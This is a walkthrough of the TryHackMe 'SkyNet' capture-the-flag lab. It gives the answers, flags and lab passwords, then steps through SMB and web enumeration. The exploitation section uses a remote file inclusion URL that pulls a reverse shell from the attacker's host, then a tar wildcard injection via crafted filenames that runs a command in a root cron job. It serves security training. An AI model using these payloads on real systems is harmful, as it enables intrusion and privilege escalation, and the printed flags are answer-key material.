# SkyNet 

## Task 1  Deploy and compromise the vulnerable machine!
+ What is Miles password for his emails?`cyborg007haloterminator`
+ What is the hidden directory?`/45kra24zxs28v3yd`
+ What is the vulnerability called when you can include a remote file for malicious purposes?`Remote File Inclusion`
+ What is the user flag?`7ce5c2109a40f958099283600a9ae807`
+ What is the root flag?`3f0372db24753accc7179a282cd6a949`

### How To Exploit 
+ Enumeration using nmap
```bash 
┌──(kali㉿kali)-[~/TryHackMe/SkyNet]
└─$ nmap -sC -sV -p- 10.10.178.40 >  nmap_skynet
```
+ Enumeration By Enum4Linux
```bash
┌──(kali㉿kali)-[~/TryHackMe/SkyNet]
└─$ enum4linux 10.10.178.40 | tee enum_log
[+] Attempting to map shares on 10.10.178.40                                                              
                                                                                                          
//10.10.178.40/print$           Mapping: DENIED Listing: N/A Writing: N/A  
//10.10.178.40/anonymous        Mapping: OK Listing: OK Writing: N/A
//10.10.178.40/milesdyson       Mapping: DENIED Listing: N/A Writing: N/A
```

+ Enumeration Samba
```bash
┌──(kali㉿kali)-[~/TryHackMe/SkyNet]
└─$ smbclient //10.10.178.40/anonymous
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir 
  .                                   D        0  Thu Nov 26 23:04:00 2020
  ..                                  D        0  Tue Sep 17 14:20:17 2019
  attention.txt                       N      163  Wed Sep 18 10:04:59 2019
  logs                                D        0  Wed Sep 18 11:42:16 2019

                9204224 blocks of size 1024. 5830332 blocks available
smb: \> get attention.txt
getting file \attention.txt of size 163 as attention.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> cd logs
smb: \logs\> dir 
  .                                   D        0  Wed Sep 18 11:42:16 2019
  ..                                  D        0  Thu Nov 26 23:04:00 2020
  log2.txt                            N        0  Wed Sep 18 11:42:13 2019
  log1.txt                            N      471  Wed Sep 18 11:41:59 2019
  log3.txt                            N        0  Wed Sep 18 11:42:16 2019

                9204224 blocks of size 1024. 5830188 blocks available
smb: \logs\> get log1.txt
getting file \logs\log1.txt of size 471 as log1.txt (0.3 KiloBytes/sec) (average 0.2 KiloBytes/sec)
```

+ Credential `milesdyson:cyborg007haloterminator`
+ From Email :
```bash
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

+ Enumeration Samba milesdyson
```bash
┌──(kali㉿kali)-[~/TryHackMe/SkyNet]
└─$ smbclient //10.10.178.40/milesdyson -U milesdyson
Password for [WORKGROUP\milesdyson]:
Try "help" to get a list of possible commands.
smb: \> dir 
  .                                   D        0  Tue Sep 17 16:05:47 2019
  ..                                  D        0  Wed Sep 18 10:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 16:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 16:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 16:05:14 2019
  notes                               D        0  Tue Sep 17 16:18:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 16:05:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 16:05:14 2019

                9204224 blocks of size 1024. 5829548 blocks available

smb: \notes\> dir 
  .                                   D        0  Tue Sep 17 16:18:40 2019
  ..                                  D        0  Tue Sep 17 16:05:47 2019
  3.01 Search.md                      N    65601  Tue Sep 17 16:01:29 2019
  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 16:01:29 2019
  2.08 In Practice.md                 N     7949  Tue Sep 17 16:01:29 2019
  0.00 Cover.md                       N     3114  Tue Sep 17 16:01:29 2019
  1.02 Linear Algebra.md              N    70314  Tue Sep 17 16:01:29 2019
  important.txt                       N      117  Tue Sep 17 16:18:39 2019
  6.01 pandas.md                      N     9221  Tue Sep 17 16:01:29 2019
  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 16:01:29 2019
  2.01 Overview.md                    N     1165  Tue Sep 17 16:01:29 2019
  3.02 Planning.md                    N    71657  Tue Sep 17 16:01:29 2019
  1.04 Probability.md                 N    62712  Tue Sep 17 16:01:29 2019
  2.06 Natural Language Processing.md      N    82633  Tue Sep 17 16:01:29 2019
  2.00 Machine Learning.md            N       26  Tue Sep 17 16:01:29 2019
  1.03 Calculus.md                    N    40779  Tue Sep 17 16:01:29 2019
  3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 16:01:29 2019
  1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 16:01:29 2019
  1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 16:01:29 2019
  6.00 Appendices.md                  N       20  Tue Sep 17 16:01:29 2019
  1.01 Functions.md                   N     7627  Tue Sep 17 16:01:29 2019
  2.03 Neural Nets.md                 N   144726  Tue Sep 17 16:01:29 2019
  2.04 Model Selection.md             N    33383  Tue Sep 17 16:01:29 2019
  2.02 Supervised Learning.md         N    94287  Tue Sep 17 16:01:29 2019
  4.00 Simulation.md                  N       20  Tue Sep 17 16:01:29 2019
  3.05 In Practice.md                 N     1123  Tue Sep 17 16:01:29 2019
  1.07 Graphs.md                      N     5110  Tue Sep 17 16:01:29 2019
  2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 16:01:29 2019
  2.05 Bayesian Learning.md           N    39443  Tue Sep 17 16:01:29 2019
  5.03 Anonymization.md               N     2516  Tue Sep 17 16:01:29 2019
  5.01 Process.md                     N     5788  Tue Sep 17 16:01:29 2019
  1.09 Optimization.md                N    25823  Tue Sep 17 16:01:29 2019
  1.05 Statistics.md                  N    64291  Tue Sep 17 16:01:29 2019
  5.02 Visualization.md               N      940  Tue Sep 17 16:01:29 2019
  5.00 In Practice.md                 N       21  Tue Sep 17 16:01:29 2019
  4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 16:01:29 2019
  1.10 Algorithms.md                  N    28790  Tue Sep 17 16:01:29 2019
  3.04 Filtering.md                   N    13360  Tue Sep 17 16:01:29 2019
  1.00 Foundations.md                 N       22  Tue Sep 17 16:01:29 2019

                9204224 blocks of size 1024. 5829548 blocks available

smb: \notes\> get important.txt
getting file \notes\important.txt of size 117 as important.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)

┌──(kali㉿kali)-[~/TryHackMe/SkyNet]
└─$ cat important.txt 

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

```bash
┌──(kali㉿kali)-[~/TryHackMe/SkyNet]
└─$ gobuster dir -u http://10.10.178.40/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.178.40/45kra24zxs28v3yd/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/administrator        (Status: 301) [Size: 337] [--> http://10.10.178.40/45kra24zxs28v3yd/administrator/]
```

### EXPLOIT 
+ Remote File Inclution (Open HTTP Server to serve revershell and listen for connection)
http://10.10.178.40/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.4.37.160:81/shell.php

### Privilege Esacalation
+ Check Linpeas
```bash
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

*/1 *   * * *   root    /home/milesdyson/backups/backup.sh

www-data@skynet:/home/milesdyson/backups$ cat backup.sh 
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

+ Creating File to Set `/bin/bash` to SUID file and wait for crontab to run
```bash
#!/bin/bash
chmod +s /bin/bash 
shell.sh
```
```bash
www-data@skynet:/var/www/html$ echo "" > "--checkpoint-action=exec=sh shell.sh"
www-data@skynet:/var/www/html$ echo "" > --checkpoint=1

www-data@skynet:/var/www/html$ /bin/bash -p
bash-4.3# cat /root/root.txt
3f0372db24753accc7179a282cd6a949
```